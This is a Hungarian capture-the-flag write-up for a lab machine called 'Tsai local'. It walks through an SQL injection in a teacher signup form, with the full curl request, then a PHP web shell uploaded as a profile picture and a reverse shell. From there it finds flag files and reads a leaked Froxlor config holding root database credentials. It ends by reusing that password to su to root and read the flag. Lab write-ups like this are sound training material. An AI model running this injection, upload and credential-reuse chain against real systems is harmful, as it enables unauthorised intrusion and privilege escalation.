# Tsai local

10.10.(1-9).12:8080 Ugye tudod mit kell tenned?

Ehhez a feladathoz nem kell writeup!

## Megoldás
A megadott címen egy weboldalt találunk. Megpróbálhatunk magunknak felhasználót regisztrálni, de az adataink nem fognak stimmelni. Hacsak át nem verjük az űrlapot
egy kis SQL varázslattal:

```
firstname: a
lastname: a' or ''='
department_id: 4
username: wwwww
password: wwwww
cpassword: wwwww
```

A teljes parancs valami ilyesmi lesz:

```
curl 'http://10.10.1.12:8080/teacher_signup.php' \
  --data-raw $'firstname=a&lastname=a\'+or+\'\'%3D\'&department_id=4&username=wwwww&password=wwwww&cpassword=wwwww'
```

Remek, most már be tudunk lépni `wwwww:wwwww`-vel. A profil oldalunkon feltölthetünk
profil képet. Ehelyett természetesen rögtön egy php shell-el próbálkozunk, amit el
is fogad, a shell.php elérhető lesz itt:

```
curl http://10.10.1.12:8080/admin/uploads/shell.php
```

A reverse shellbe belépve kicsit körülnézünk a gépen `find / -name '*flag*' 2>/dev/null` és meg is van az első flag.

## Root

A tmp-ben van egy érdekes fájl.

```
$ cat /tmp/fxKScHMZ
<?php
// automatically generated userdata.inc.php for Froxlor
$sql['host']='127.0.0.1';
$sql['user']='froxlor';
$sql['password']='ro07p@55!';
$sql['db']='froxlor';
$sql['ssl']['caFile']='';
$sql['ssl']['verifyServerCertificate']='0';
$sql_root[0]['caption']='Default';
$sql_root[0]['host']='127.0.0.1';
$sql_root[0]['user']='root';
$sql_root[0]['password']='ro07p@55!';
$sql_root[0]['ssl']['caFile']='';
$sql_root[0]['ssl']['verifyServerCertificate']='0';
// enable debugging to browser in case of SQL errors
$sql['debug'] = false;
?>
```

Ezt megpróbálhatjuk jelszónak használni:
```
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ su root
su root
Password: ro07p@55!
```

Siker
```
cd /root
root@24d7dcf3a96e:~# ls
ls
abook.zip  froxlor.tar.gz                   phpabook v0.9  salonerp-3.0.1.zip
dump.sql   nia_munoz_monitoring_system.zip  root_flag.txt
root@24d7dcf3a96e:~# cat root_flag.txt
```
Meg is van:
```
{HCSC}T5@!:[R0otFl4G!]
```